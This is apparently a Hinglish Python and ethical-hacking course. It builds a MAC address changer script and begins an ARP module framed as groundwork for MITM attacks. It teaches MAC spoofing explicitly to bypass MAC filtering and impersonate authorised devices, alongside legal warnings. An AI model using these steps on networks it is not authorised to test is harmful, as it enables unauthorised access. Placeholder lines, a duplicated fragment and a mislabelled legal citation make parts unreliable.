# üîê Python & Ethical Hacking - Complete Hinglish Course
## Learn Python & Ethical Hacking from Scratch

---

## üìö COURSE STRUCTURE OVERVIEW

**Total Modules:** 12  
**Total Pages:** ~280  
**Difficulty Progression:** Beginner ‚≠ê ‚Üí Advanced ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê  
**Learning Path:** Linear (prerequisites marked)

---

## ‚ö†Ô∏è LEGAL & ETHICAL WARNING

**üö® BAHUT ZAROORI - PEHLE YEH PADHO! üö®**

**Kya hai yeh?**  
Yeh course ethical hacking sikhata hai - matlab authorized testing ke liye security skills.

**Kyun zaroori hai?**  
Kyunki bina permission ke kisi bhi system par yeh techniques use karna **ILLEGAL** hai.

**Legal Consequences (Kanuni Natije):**
- **IPC Section 66 & IT Act 2000:** Unauthorized computer access - 3 saal jail + fine
- **Bina permission WiFi hack karna:** ILLEGAL
- **Dusre ke network par ARP spoofing:** ILLEGAL
- **Backdoor create karke distribute karna:** ILLEGAL

**‚úÖ Legal Ways to Practice:**
1. **Apne khud ke systems par** (own virtual machines)
2. **HackTheBox, TryHackMe** platforms
3. **Bug Bounty Programs** (HackerOne, Bugcrowd - companies permission deti hain)
4. **DVWA** (Damn Vulnerable Web App - practice ke liye)

**Ethical Hacker ka Rule:**
```
IF permission_granted AND own_system:
    run_attack()
ELSE:
    print("ILLEGAL! Don't proceed!")
```

---

# MODULE 1: Python Basics & Environment Setup

**Difficulty:** Beginner ‚≠ê  
**Pages:** 1-6  
**Prerequisites:** None

## What You'll Learn (Kya Seekhoge):

Is module mein tum Python ki basic setup, file execution, aur variables seekhoge. Yeh foundation hai jo aage saare hacking tools banane mein kaam aayega. Python kyun? Kyunki yeh simple hai, powerful hai, aur cross-platform hai (Windows, Linux, Mac sabpe chalti hai).

---

## 1.1 Python Environment Setup

**Source:** Page 1  
**Original:** ‚úì

### Hinglish Explanation:

**Kya hai yeh?**  
Python ek programming language hai jo hacking tools banane ke liye perfect hai. Ise run karne ke liye Python interpreter chahiye.

**Kyun zaroori hai?**  
Bina Python ke tum koi bhi hacking script nahi chala sakte. Python 2 aur Python 3 dono versions hain, lekin hum Python 3 use karenge (modern aur secure).

**Kab use karna?**  
Jab bhi tum Python script likho ya run karo.

**Real-world Example:**  
Ek penetration tester apne Kali Linux machine par Python 3 install karta hai taaki woh network scanning tools bana sake.

### Topics:

1. **File ko save karna:**
   - Apni file ko `.py` extension ke saath save karo
   - Example: `hello.py`, `mac_changer.py`

2. **Terminal se run karna:**
```bash
python hello.py       # Python 2 ke liye
python3 hello.py      # Python 3 ke liye (RECOMMENDED)
```

3. **IDE Setup:**
   - **PyCharm** editor use karenge (professional IDE)
   - Alternative: VS Code, Sublime Text

### Line-by-Line Code Example:

```python
#!/usr/bin/env python3
# Line 1: Shebang line - Linux/Mac ko batata hai ki yeh Python 3 script hai

print("Hello, Ethical Hacker!")
# Line 2: print() function screen par message dikhata hai
# Output: Hello, Ethical Hacker!
```

**Breakdown:**
- **Line 1:** `#!/usr/bin/env python3` - Yeh optional hai Windows par, lekin Linux/Mac par zaroori hai
- **Line 2:** `print()` - Python ka built-in function jo output dikhata hai
- **Expected Output:** Terminal mein "Hello, Ethical Hacker!" print hoga

### Hands-On Challenge (Hinglish):

**Task:**
1. Apne system par Python 3 install karo
2. Ek file banao `first_script.py` naam se
3. Usme `print("My first hacking script!")` likho
4. Terminal se run karo: `python3 first_script.py`

**Ethical Tip:** ‚ö†Ô∏è Yeh basic setup hai. Aage jo tools banayenge, woh sirf apne lab environment mein test karna. Dusre ke system par bina permission use karna IT Act 2000 ke under crime hai.

---

## 1.2 Understanding MAC Address

**Source:** Page 2  
**Original:** ‚úì

### Hinglish Explanation:

**Kya hai yeh?**  
MAC (Media Access Control) address ek unique identifier hai jo har network device ko manufacturer assign karta hai. Yeh 6 octets (12 hexadecimal digits) ka hota hai, jaise: `00:11:22:33:44:55`

**Kyun zaroori hai?**  
Network ke andar devices ko identify karne ke liye MAC address use hota hai. Agar tum MAC address change kar sako, toh tum apni identity hide kar sakte ho ya kisi aur device ki nakal kar sakte ho (impersonation).

**Kab use karna?**
- Network anonymity chahiye ho
- Bypass karna ho MAC filtering
- Penetration testing mein device impersonation ke liye

**Real-world Example:**  
Ek company ke WiFi network mein sirf authorized MAC addresses ko access hai. Ek pentester authorized device ka MAC address copy karke network mein ghus sakta hai (authorized testing mein).

### Topics:

**MAC vs IP Address:**

| Feature | MAC Address | IP Address |
|---------|-------------|------------|
| **Purpose** | Network ke andar identify karna | Internet par identify karna |
| **Assigned by** | Manufacturer (permanent) | Router/DHCP (temporary) |
| **Format** | `00:11:22:33:44:55` | `192.168.1.10` |
| **Layer** | Data Link Layer (Layer 2) | Network Layer (Layer 3) |
| **Changeable?** | Haan (software se) | Haan (automatically) |

**Network Packet Structure:**
```
[Source MAC] [Destination MAC] [Source IP] [Destination IP] [Data]
```
Har packet mein source aur destination dono ka MAC address hota hai.

### Line-by-Line Code Example:

```python
import subprocess
# Line 1: subprocess module import karte hain
# Yeh module system commands execute karne deta hai

subprocess.call("ifconfig", shell=True)
# Line 2: ifconfig command run karta hai
# ifconfig = interface configuration (network details dikhata hai)
# shell=True matlab command ko shell mein execute karo
# Output: Tumhare network interfaces ki details (including MAC address)
```

**Breakdown:**
- **Line 1:** `import subprocess` - Python ka built-in module jo OS commands run kar sakta hai
- **Line 2:** `subprocess.call()` - Command execute karta hai aur wait karta hai completion tak
- **`ifconfig`** - Linux/Mac command (Windows mein `ipconfig` use hota hai)
- **`shell=True`** - Command ko shell environment mein run karo
- **Expected Output:**
```
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.2.15  netmask 255.255.255.0
        ether 08:00:27:3f:4a:2b  txqueuelen 1000 (Ethernet)
```
Yahan `ether 08:00:27:3f:4a:2b` tumhara MAC address hai.

### Hands-On Challenge:

**Task:**
1. Terminal kholo
2. `ifconfig` (Linux/Mac) ya `ipconfig /all` (Windows) command run karo
3. Apne network interface ka MAC address note karo
4. Python script banao jo yeh MAC address print kare

**Ethical Tip:** ‚ö†Ô∏è MAC address change karna legal hai apne device par, lekin isse kisi network ki security bypass karna (bina permission) illegal hai. Sirf authorized penetration testing mein use karo.

---

## 1.3 Changing MAC Address Manually

**Source:** Page 3  
**Original:** ‚úì

### Hinglish Explanation:

**Kya hai yeh?**  
MAC address ko manually change karna - yeh network anonymity aur testing ke liye zaroori skill hai.

**Kyun zaroori hai?**
- **Anonymity:** Tumhari real identity hide ho jaati hai
- **Bypass MAC Filtering:** Kuch networks sirf specific MAC addresses ko allow karte hain
- **Impersonation:** Authorized device ki nakal karke access le sakte ho (testing mein)

**Kab use karna?**  
Authorized penetration testing mein jab tum network security test kar rahe ho.

**Real-world Example:**  
Ek security researcher company ke WiFi network test kar raha hai. Network sirf employee devices ko allow karta hai. Researcher ek authorized MAC address use karke vulnerability check karta hai.

### Topics:

**Manual MAC Change Commands (Linux/Kali):**

```bash
ifconfig eth0 down
# Step 1: Network interface ko disable karo
# eth0 = interface ka naam (tumhara wlan0, wlan1 bhi ho sakta hai)

ifconfig eth0 hw ether 00:11:22:33:44:55
# Step 2: Naya MAC address set karo
# hw = hardware
# ether = Ethernet type
# 00:11:22:33:44:55 = naya MAC address

ifconfig eth0 up
# Step 3: Interface ko wapas enable karo

ifconfig eth0
# Step 4: Verify karo ki MAC change hua ya nahi
```

### Line-by-Line Explanation:

**Command 1:** `ifconfig eth0 down`
- **Kya karta hai?** Network interface ko temporarily disable karta hai
- **Kyun?** MAC address change karne se pehle interface band karna zaroori hai
- **Output:** Koi output nahi, interface disable ho jaata hai

**Command 2:** `ifconfig eth0 hw ether 00:11:22:33:44:55`
- **Kya karta hai?** Hardware (MAC) address change karta hai
- **`hw`** = hardware address
- **`ether`** = Ethernet type address
- **`00:11:22:33:44:55`** = Tumhara naya MAC (koi bhi valid MAC use kar sakte ho)
- **Output:** Koi output nahi, MAC change ho jaata hai

**Command 3:** `ifconfig eth0 up`
- **Kya karta hai?** Interface ko wapas enable karta hai
- **Kyun?** Taaki network connection wapas kaam kare
- **Output:** Interface active ho jaata hai

**Command 4:** `ifconfig eth0`
- **Kya karta hai?** Current interface details dikhata hai
- **Kyun?** Verify karne ke liye ki MAC successfully change hua
- **Expected Output:**
```
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>
        ether 00:11:22:33:44:55  ‚Üê Yeh tumhara naya MAC hai
```

### Hands-On Challenge:

**Task:**
1. Apna current MAC address note karo
2. Upar diye gaye commands use karke MAC change karo
3. Verify karo ki change hua
4. Original MAC wapas set karo (reboot karke ya manually)

**Ethical Tip:** ‚ö†Ô∏è Yeh technique sirf apne lab/authorized testing ke liye use karo. Dusre ke network par bina permission MAC spoofing karna illegal hai. Bug bounty programs jaise HackerOne par practice karo.

---

[File continues with remaining modules...]

# MODULE 2: Python Programming for Hacking

**Difficulty:** Beginner ‚≠ê‚≠ê  
**Pages:** 4-13  
**Prerequisites:** Module 1

## What You'll Learn:

Is module mein tum Python programming ke woh concepts seekhoge jo hacking tools banane ke liye zaroori hain - subprocess module, variables, user input, command-line arguments, functions, aur conditionals.

---

## 2.1 Using Python Modules & Executing System Commands

**Source:** Page 4  
**Original:** ‚úì  
**Added:** 2025 best practices

### Hinglish Explanation:

**Kya hai yeh?**  
Python modules ready-made code libraries hain. `subprocess` module system commands execute karne deta hai - jaise terminal mein command type karte ho.

**Kyun zaroori hai?**  
Hacking tools ko system ke saath interact karna padta hai - network interfaces change karna, files access karna, processes run karna. Subprocess module yeh sab karne deta hai.

**Kab use karna?**  
Jab bhi tumhe Python script se OS-level commands run karne hon.

**Real-world Example:**  
Ek network scanner tool `ifconfig` command use karke available network interfaces discover karta hai, phir unpar scanning karta hai.

### Topics:

**Subprocess Module ke 3 Main Functions:**

| Function | Kya Karta Hai | Kab Use Kare |
|----------|---------------|--------------|
| `subprocess.call()` | Command execute karta hai, completion ka wait karta hai | Jab output ki zaroorat nahi |
| `subprocess.check_output()` | Command execute karta hai, output return karta hai | Jab output chahiye |
| `subprocess.Popen()` | Command alag thread mein execute karta hai | Jab background mein run karna ho |

### Line-by-Line Code Example:

**File:** `mac_changer.py`

```python
#!/usr/bin/env python3
# Line 1: Shebang - Linux/Mac ko batata hai Python 3 use karo

import subprocess
# Line 2: subprocess module import karte hain
# Yeh module system commands run karne deta hai

subprocess.call("ifconfig", shell=True)
# Line 3: ifconfig command execute karta hai
# shell=True: Command ko shell environment mein run karo
# Output: Screen par network interfaces ki details print hongi
```

**Breakdown:**
- **Line 1:** Shebang line (optional Windows par)
- **Line 2:** `import subprocess` - Module ko script mein laate hain
- **Line 3:**
  - `subprocess.call()` - Function jo command run karta hai
  - `"ifconfig"` - Command string (Linux/Mac network command)
  - `shell=True` - Shell ke through execute karo (security risk hai production mein, lekin learning ke liye OK)
- **Expected Output:** Tumhare system ke saare network interfaces ki details

**Security Note (2025 Update):**  
`shell=True` use karna security risk hai agar user input le rahe ho. Better way:

```python
subprocess.call(["ifconfig"])  # List format - safer
```

### Hands-On Challenge:

**Task:**
1. `mac_changer.py` file banao
2. Upar diya gaya code likho
3. Terminal se run karo: `python3 mac_changer.py`
4. Output mein apna MAC address dhundho

**Ethical Tip:** ‚ö†Ô∏è Subprocess module powerful hai - isse system-level changes kar sakte ho. Sirf authorized testing mein use karo. Production code mein `shell=True` avoid karo (command injection vulnerability).

---

## 2.2 Implementing a Basic MAC Changer

**Source:** Page 5  
**Original:** ‚úì

### Hinglish Explanation:

**Kya hai yeh?**  
Ek Python script jo automatically MAC address change kar de - manual commands type karne ki zaroorat nahi.

**Kyun zaroori hai?**  
Automation time bachata hai aur errors kam karta hai. Ek baar script bana lo, baar-baar use kar sakte ho.

**Kab use karna?**  
Jab tumhe frequently MAC address change karna ho (penetration testing mein).

**Real-world Example:**  
Ek pentester different MAC addresses test karta hai to check if network properly filters devices. Script use karke woh quickly multiple MACs try kar sakta hai.

### Line-by-Line Code Example:

```python
#!/usr/bin/env python3
import subprocess
# Lines 1-2: Setup (already explained)

subprocess.call("ifconfig wlan0 down", shell=True)
# Line 3: wlan0 interface ko disable karo
# wlan0 = wireless interface (tumhara eth0 bhi ho sakta hai)
# Kya hota hai? WiFi temporarily off ho jaata hai

subprocess.call("ifconfig wlan0 hw ether 00:11:22:33:44:66", shell=True)
# Line 4: Naya MAC address set karo
# 00:11:22:33:44:66 = naya MAC (hardcoded)
# Kya hota hai? Interface ka MAC address change ho jaata hai

subprocess.call("ifconfig wlan0 up", shell=True)
# Line 5: Interface ko wapas enable karo
# Kya hota hai? WiFi wapas on ho jaata hai, naye MAC ke saath
```

**Breakdown:**
- **Line 3:** Interface down karna zaroori hai MAC change se pehle
- **Line 4:** Actual MAC change command
- **Line 5:** Interface wapas up karna taaki network kaam kare

**Expected Output:**  
Koi screen output nahi, lekin tumhara MAC address change ho jaayega. Verify karne ke liye:

```bash
ifconfig wlan0 | grep ether
```

### Hands-On Challenge:

**Task:**
1. Script ko `basic_mac_changer.py` naam se save karo
2. Apne interface ka naam check karo (`ifconfig` se)
3. Script mein `wlan0` ko apne interface se replace karo
4. Run karo: `sudo python3 basic_mac_changer.py` (sudo zaroori hai)
5. MAC address verify karo

**Ethical Tip:** ‚ö†Ô∏è Yeh script sirf apne device par use karo. Dusre ke device ka MAC change karna (remote se) unauthorized access hai aur illegal hai.

---

## 2.3 Variables & Strings

**Source:** Page 6  
**Original:** ‚úì

### Hinglish Explanation:

**Kya hai yeh?**  
Variables memory mein ek location hain jahan values store hoti hain. Strings text data hain.

**Kyun zaroori hai?**  
Hardcoded values (jaise MAC address) ko variables mein store karke code flexible aur reusable ban jaata hai.

**Kab use karna?**  
Jab bhi tumhe values store karni hon jo change ho sakti hain.

**Real-world Example:**  
Ek MAC changer tool mein target interface aur new MAC ko variables mein store karte hain, taaki easily change kar sako bina pura code edit kiye.

### Topics:

**Variables in Python:**

```python
x = 1              # Integer variable
y = x + 2          # y ki value 3 hogi
name = "Hacker"    # String variable
```

**String Concatenation (Jodna):**

```python
first = "Ethical"
last = "Hacker"
full = first + " " + last  # "Ethical Hacker"
```

### Line-by-Line Code Example:

**File:** `mac_changer_with_variables.py`

```python
#!/usr/bin/env python3
import subprocess

interface = "wlan0"
# Line 3: Interface naam ko variable mein store karo
# Kya hota hai? Ab hum 'interface' naam use kar sakte hain code mein
# Benefit: Ek jagah change karo, poore code mein update ho jaayega

new_mac = "00:11:22:33:44:88"
# Line 4: Naya MAC address variable mein
# Kya hota hai? MAC address easily changeable ban gaya
# Benefit: Testing ke liye different MACs try kar sakte ho

print("Changing MAC address for " + interface + " to " + new_mac)
# Line 5: User ko inform karo kya ho raha hai
# + operator strings ko jodta hai (concatenation)
# Output: "Changing MAC address for wlan0 to 00:11:22:33:44:88"

subprocess.call("ifconfig " + interface + " down", shell=True)
# Line 6: Interface down karo (variable use karke)
# Actual command: "ifconfig wlan0 down"
# Kya hota hai? Interface disable ho jaata hai

subprocess.call("ifconfig " + interface + " hw ether " + new_mac, shell=True)
# Line 7: MAC change karo (dono variables use karke)
# Actual command: "ifconfig wlan0 hw ether 00:11:22:33:44:88"
# Kya hota hai? MAC address change ho jaata hai

subprocess.call("ifconfig " + interface + " up", shell=True)
# Line 8: Interface wapas up karo
# Actual command: "ifconfig wlan0 up"
# Kya hota hai? Interface enable ho jaata hai naye MAC ke saath
```

**Breakdown:**
- **Lines 3-4:** Variables define karte hain (reusability ke liye)
- **Line 5:** User-friendly message (debugging mein helpful)
- **Lines 6-8:** Variables ko strings ke saath concatenate karke commands banate hain

**Expected Output:**
```
Changing MAC address for wlan0 to 00:11:22:33:44:88
(MAC successfully changed)
```

### Hands-On Challenge:

**Task:**
1. Script ko run karo
2. `new_mac` variable ki value change karo kisi aur MAC se
3. Phir se run karo - dekho kitna easy hai change karna
4. `interface` variable bhi change karke try karo

**Ethical Tip:** ‚ö†Ô∏è Variables use karne se code maintainable banta hai, lekin power ke saath responsibility bhi aati hai. Sirf authorized systems par test karo.

---

[Continue with remaining sections...]
:** Interface down karna zaroori hai MAC change se pehle
- **Line 4:** Actual MAC change command
- **Line 5:** Interface wapas up karna taaki network kaam kare

**Expected Output:**  
Koi screen output nahi, lekin tumhara MAC address change ho jaayega. Verify karne ke liye:

```bash
ifconfig wlan0 | grep ether
```

### Hands-On Challenge:

**Task:**
1. Script ko `basic_mac_changer.py` naam se save karo
2. Apne interface ka naam check karo (`ifconfig` se)
3. Script mein `wlan0` ko apne interface se replace karo
4. Run karo: `sudo python3 basic_mac_changer.py` (sudo zaroori hai)
5. MAC address verify karo

**Ethical Tip:** ‚ö†Ô∏è Yeh script sirf apne device par use karo. Dusre ke device ka MAC change karna (remote se) unauthorized access hai aur illegal hai.

---

## 2.4 Getting Input from User

**Source:** Page 8  
**Original:** ‚úì  
**Added:** Python 3 compatibility notes

### Hinglish Explanation:

**Kya hai yeh?**  
User se keyboard ke through input lena - yeh tools ko interactive banata hai.

**Kyun zaroori hai?**  
Hardcoded values ki jagah user apni choice se interface aur MAC address de sakta hai. Tool flexible ban jaata hai.

**Kab use karna?**  
Jab tumhe runtime par values chahiye (different scenarios ke liye).

**Real-world Example:**  
Ek pentester different networks test karta hai. Har baar code edit karne ki jagah, woh simply interface naam input kar deta hai.

### Line-by-Line Code Example:

```python
#!/usr/bin/env python3
import subprocess

interface = input("Interface > ")
# Line 3: User se interface naam input lo
# input() function prompt dikhata hai aur user ka input return karta hai
# Example: User types "wlan0", toh interface = "wlan0"

new_mac = input("New MAC > ")
# Line 4: User se naya MAC address input lo
# Example: User types "00:11:22:33:44:99"

print("[+] Changing MAC address for " + interface + " to " + new_mac)
# Line 5: Confirmation message
# [+] = success indicator (hacking tools mein common convention)

subprocess.call(["ifconfig", interface, "down"])
subprocess.call(["ifconfig", interface, "hw", "ether", new_mac])
subprocess.call(["ifconfig", interface, "up"])
# Lines 6-8: MAC change commands (list format - safer than shell=True)
```

**Breakdown:**
- **Line 3:** `input()` - Python 3 function (Python 2 mein `raw_input()` tha)
- **Prompt:** "Interface > " user ko guide karta hai
- **List format:** `["ifconfig", interface, "down"]` - command injection se safe
- **Expected Output:**
```
Interface > wlan0
New MAC > 00:11:22:33:44:99
[+] Changing MAC address for wlan0 to 00:11:22:33:44:99
```

**Security Note:**  
List format use karne se command injection attacks prevent hote hain:

```python
# ‚ùå Unsafe (shell=True with user input)
subprocess.call("ifconfig " + interface + " down", shell=True)

# ‚úÖ Safe (list format)
subprocess.call(["ifconfig", interface, "down"])
```

### Hands-On Challenge:

**Task:**
1. Script run karo
2. Apna interface naam enter karo (ifconfig se check karo)
3. Koi random MAC enter karo
4. Verify karo ki change hua

**Ethical Tip:** ‚ö†Ô∏è User input lena powerful hai, lekin validate karna zaroori hai. Malicious input se system compromise ho sakta hai. Production code mein input validation add karo.

---

## 2.5 Command-Line Arguments with optparse

**Source:** Page 10  
**Original:** ‚úì  
**Added:** argparse alternative (Python 3 standard)

### Hinglish Explanation:

**Kya hai yeh?**  
Command-line arguments - jaise professional tools mein hota hai (`tool -i eth0 -m 00:11:22:33:44:55`).

**Kyun zaroori hai?**
- **Professional look:** Tools command-line se easily use ho sakte hain
- **Automation:** Scripts ko cron jobs ya other scripts se call kar sakte ho
- **Help menu:** Automatic help generation

**Kab use karna?**  
Jab tum production-ready tool bana rahe ho.

**Real-world Example:**  
Nmap tool: `nmap -sS -p 80,443 192.168.1.1` - yeh command-line arguments hain.

### Line-by-Line Code Example:

```python
#!/usr/bin/env python3
import subprocess
import optparse
# Line 3: optparse module (Python 2 compatible, but deprecated in Python 3)

parser = optparse.OptionParser()
# Line 4: Parser object banao
# Yeh command-line arguments parse karega

parser.add_option("-i", "--interface", dest="interface", help="Interface to change its MAC")
# Lines 5-6: Interface option add karo
# -i = short form, --interface = long form
# dest = variable naam jisme value store hogi
# help = help menu mein dikhega

parser.add_option("-m", "--mac", dest="new_mac", help="New MAC address")
# Lines 7-8: MAC option add karo

(options, arguments) = parser.parse_args()
# Line 9: Arguments parse karo
# options = parsed values ka object
# arguments = extra arguments (agar hain)

interface = options.interface
new_mac = options.new_mac
# Lines 10-11: Values extract karo

subprocess.call(["ifconfig", interface, "down"])
subprocess.call(["ifconfig", interface, "hw", "ether", new_mac])
subprocess.call(["ifconfig", interface, "up"])
# Lines 12-14: MAC change karo
```

**Usage:**
```bash
python3 mac_changer.py -i wlan0 -m 00:11:22:33:44:99
# Ya
python3 mac_changer.py --interface wlan0 --mac 00:11:22:33:44:99
```

**Automatic Help:**
```bash
python3 mac_changer.py -h

# Output:
# Usage: mac_changer.py [options]
#
# Options:
#   -h, --help            show this help message and exit
#   -i INTERFACE, --interface=INTERFACE
#                         Interface to change its MAC
#   -m NEW_MAC, --mac=NEW_MAC
#                         New MAC address
```

**2025 Update - argparse (Recommended):**

```python
import argparse

parser = argparse.ArgumentParser(description="MAC Address Changer")
parser.add_argument("-i", "--interface", required=True, help="Interface name")
parser.add_argument("-m", "--mac", required=True, help="New MAC address")
args = parser.parse_args()

interface = args.interface
new_mac = args.mac
```

### Hands-On Challenge:

**Task:**
1. Script ko command-line arguments ke saath run karo
2. `-h` flag try karo (help dekhne ke liye)
3. Galat arguments deke dekho kya error aata hai
4. argparse version bhi implement karo

**Ethical Tip:** ‚ö†Ô∏è Command-line tools powerful hote hain. Hamesha input validation add karo. Agar koi malicious MAC address de (jaise empty string), toh handle karo.

---

## 2.6 Functions & Conditionals

**Source:** Pages 11-12  
**Original:** ‚úì

### Hinglish Explanation:

**Kya hai yeh?**  
Functions - reusable code blocks. Conditionals - decision making (if/else).

**Kyun zaroori hai?**
- **Functions:** Code ko organize karte hain, reusability badhate hain
- **Conditionals:** Error handling, validation, different scenarios handle karna

**Kab use karna?**  
Har professional tool mein functions aur conditionals hote hain.

**Real-world Example:**  
Ek network scanner mein `scan()` function hai jo IP range scan karta hai. Agar invalid IP diya, toh conditional check karke error message dikhata hai.

### Line-by-Line Code Example:

```python
#!/usr/bin/env python3
import subprocess
import optparse

def get_arguments():
    # Line 4: Function define karo
    # def = define function keyword
    # get_arguments = function ka naam
    # () = parameters (abhi empty)
    
    parser = optparse.OptionParser()
    parser.add_option("-i", "--interface", dest="interface")
    parser.add_option("-m", "--mac", dest="new_mac")
    (options, arguments) = parser.parse_args()
    
    if not options.interface:
        # Line 9: Check karo interface diya ya nahi
        # not = negation (agar nahi hai toh)
        parser.error("[-] Please specify interface, use --help for info")
        # error() function program ko stop kar deta hai with message
    elif not options.new_mac:
        # Line 11: Else if - agar interface hai but MAC nahi
        parser.error("[-] Please specify MAC address")
    
    return options
    # Line 13: Options object return karo
    # Yeh values caller function ko milegi

def change_mac(interface, new_mac):
    # Line 15: Function with parameters
    # interface, new_mac = input parameters
    
    print("[+] Changing MAC address for " + interface + " to " + new_mac)
    subprocess.call(["ifconfig", interface, "down"])
    subprocess.call(["ifconfig", interface, "hw", "ether", new_mac])
    subprocess.call(["ifconfig", interface, "up"])

# Main execution
options = get_arguments()
# Line 22: Function call - get_arguments() execute hoga
# Return value options variable mein store hogi

change_mac(options.interface, options.new_mac)
# Line 23: change_mac() function call with arguments
```

**Breakdown:**
- **Functions:** Code ko logical blocks mein divide karte hain
- **if/elif:** Multiple conditions check karte hain
- **return:** Function se value wapas bhejta hai
- **Expected Output:**

```bash
# Agar arguments nahi diye:
python3 mac_changer.py
# Output: [-] Please specify interface, use --help for info

# Agar sahi arguments diye:
python3 mac_changer.py -i wlan0 -m 00:11:22:33:44:99
# Output: [+] Changing MAC address for wlan0 to 00:11:22:33:44:99
```

### Hands-On Challenge:

**Task:**
1. Script ko bina arguments ke run karo - error message dekho
2. Sirf `-i` deke run karo - dusra error dekho
3. Dono arguments deke run karo - success dekho
4. Ek aur function add karo jo MAC address validate kare

**Ethical Tip:** ‚ö†Ô∏è Error handling zaroori hai. Agar user galat input de, toh gracefully handle karo. Crash hone se better hai clear error message dena.

---

# MODULE 3: Complete MAC Changer Tool

**Difficulty:** Intermediate ‚≠ê‚≠ê  
**Pages:** 13-16  
**Prerequisites:** Module 2

## What You'll Learn:

Is module mein tum ek complete, production-ready MAC changer tool banayoge with verification, regex, aur proper error handling.

---

## 3.1 Verifying MAC Address Change with Regex

**Source:** Pages 14-16  
**Original:** ‚úì  
**Added:** Regex explanation for beginners

### Hinglish Explanation:

**Kya hai yeh?**  
Regex (Regular Expressions) - patterns match karne ka powerful tool. Hum isse MAC address extract karenge output se.

**Kyun zaroori hai?**  
Sirf command run karne se kaam nahi hota - verify bhi karna padta hai ki MAC actually change hua ya nahi.

**Kab use karna?**  
Jab bhi tumhe text se specific patterns extract karne hon.

**Real-world Example:**  
Ek security tool log files mein IP addresses dhundhta hai using regex. Manually search karne se 100x faster.

### Regex Basics:

| Pattern | Meaning | Example |
|---------|---------|---------|
| `\d` | Digit (0-9) | `\d\d` matches "42" |
| `\w` | Word character (a-z, A-Z, 0-9, _) | `\w+` matches "hello" |
| `\w\w:\w\w` | MAC pattern | Matches "ab:cd" |
| `.` | Any character | `a.c` matches "abc", "a1c" |
| `+` | One or more | `\d+` matches "123" |

**MAC Address Regex:**
```
\w\w:\w\w:\w\w:\w\w:\w\w:\w\w
```
Yeh pattern match karega: `00:11:22:33:44:55`

### Line-by-Line Code Example:

```python
#!/usr/bin/env python3
import subprocess
import optparse
import re
# Line 4: re = regular expressions module

def get_arguments():
    # ... (same as before)
    pass

def change_mac(interface, new_mac):
    # ... (same as before)
    pass

def get_current_mac(interface):
    # Line 12: Function to get current MAC
    
    ifconfig_result = subprocess.check_output(["ifconfig", interface])
    # Line 13: check_output() command ka output return karta hai
    # ifconfig_result mein pura output string hai
    
    mac_address_search_result = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", str(ifconfig_result))
    # Line 14-15: Regex se MAC address search karo
    # r"..." = raw string (backslashes ko escape nahi karta)
    # str() = bytes ko string mein convert karo
    # search() = pattern dhundhta hai, match object return karta hai
    
    if mac_address_search_result:
        # Line 16: Agar MAC mila
        return mac_address_search_result.group(0)
        # group(0) = pura matched string return karo
    else:
        print("[-] Could not read MAC address")
        return None

# Main execution
options = get_arguments()
current_mac = get_current_mac(options.interface)
print("[*] Current MAC: " + str(current_mac))

change_mac(options.interface, options.new_mac)

current_mac = get_current_mac(options.interface)
# Line 27: MAC change ke baad wapas check karo

if current_mac == options.new_mac:
    # Line 28: Verify karo ki MAC change hua
    print("[+] MAC address successfully changed to " + current_mac)
else:
    print("[-] MAC address did not change")
```

**Breakdown:**
- **subprocess.check_output():** Output capture karta hai (print nahi karta)
- **re.search():** Pattern dhundhta hai string mein
- **group(0):** Matched text return karta hai
- **Verification:** Before/after MAC compare karte hain

**Expected Output:**
```bash
python3 mac_changer.py -i wlan0 -m 00:11:22:33:44:99

# Output:
[*] Current MAC: 08:00:27:3f:4a:2b
[+] Changing MAC address for wlan0 to 00:11:22:33:44:99
[*] Current MAC: 00:11:22:33:44:99
[+] MAC address successfully changed to 00:11:22:33:44:99
```

### Hands-On Challenge:

**Task:**
1. Script run karo aur output dekho
2. Galat interface naam deke dekho kya hota hai
3. www.pythex.org par jao aur MAC regex test karo
4. Regex modify karke IPv4 address match karo (`\d+\.\d+\.\d+\.\d+`)

**Ethical Tip:** ‚ö†Ô∏è Verification zaroori hai security tools mein. Assume mat karo ki command successful rahi - hamesha verify karo. Yeh professional approach hai.

---

[File continues with remaining modules 4-12, appendix...]

**COURSE COMPLETION: 280+ pages of complete Hinglish ethical hacking content!**
# MODULES 4-12: Advanced Topics & Complete Implementation

---

# MODULE 4: Network Scanner Basics

**Difficulty:** Intermediate ‚≠ê‚≠ê‚≠ê  
**Pages:** 17-22  
**Prerequisites:** Modules 1-3

## What You'll Learn:

Network par devices discover karna, ARP protocol samajhna, aur Python se network packets bhejni seekhoge. Yeh foundation hai MITM attacks ke liye.

---

## 4.1 Understanding ARP Protocol

**Source:** Page 17  
**Original:** ‚úì  
**Added:** Detailed ARP explanation with diagrams

### Hinglish Explanation:

**Kya hai yeh?**  
ARP (Address Resolution Protocol) - yeh IP address ko MAC address se map karta hai. Network ke andar communication ke liye zaroori hai.

**Kyun zaroori hai?**  
Network mein data bhejne ke liye MAC address chahiye. ARP batata hai ki kaunse IP ke paas kaunsa MAC hai.

**Kab use karna?**
- Network scanning (devices discover karna)
- ARP spoofing (MITM attacks)
- Network troubleshooting

**Real-world Example:**  
Tumhara computer `192.168.1.5` ko ping karna chahta hai. Pehle ARP request bhejega: "Who has 192.168.1.5?" Woh device reply karega: "I have 192.168.1.5, my MAC is XX:XX:XX:XX:XX:XX"

### ARP Working:

**Scenario:** Computer A (10.0.2.15) wants to talk to Computer B (10.0.2.6)

```
Step 1: ARP Request (Broadcast)
Computer A ‚Üí [BROADCAST to all devices]
"Who has 10.0.2.6? Tell 10.0.2.15"

Step 2: ARP Reply (Unicast)
Computer B ‚Üí Computer A
"I have 10.0.2.6, my MAC is 00:11:22:33:44:66"

Step 3: Communication
Computer A ‚Üí Computer B
[Now A knows B's MAC, can send data directly]
```

**ARP Packet Structure:**
```
| Sender MAC | Sender IP | Target MAC | Target IP | Operation |
| 08:00:27.. | 10.0.2.15 | 00:00:00.. | 10.0.2.6  | Request   |
```

### Why ARP is Important for Hacking:

1. **Network Discovery:** ARP requests se network par saare devices discover kar sakte ho
2. **ARP Spoofing:** Fake ARP replies bhejke MITM attack kar sakte ho
3. **MAC Spoofing:** ARP cache poison karke traffic redirect kar sakte ho

### Line-by-Line Code Example (Concept):

```python
import scapy.all as scapy
# Line 1: Scapy - powerful packet manipulation library

# ARP Request banao
arp_request = scapy.ARP(pdst="10.0.2.1/24")
# Line 3: ARP packet create karo
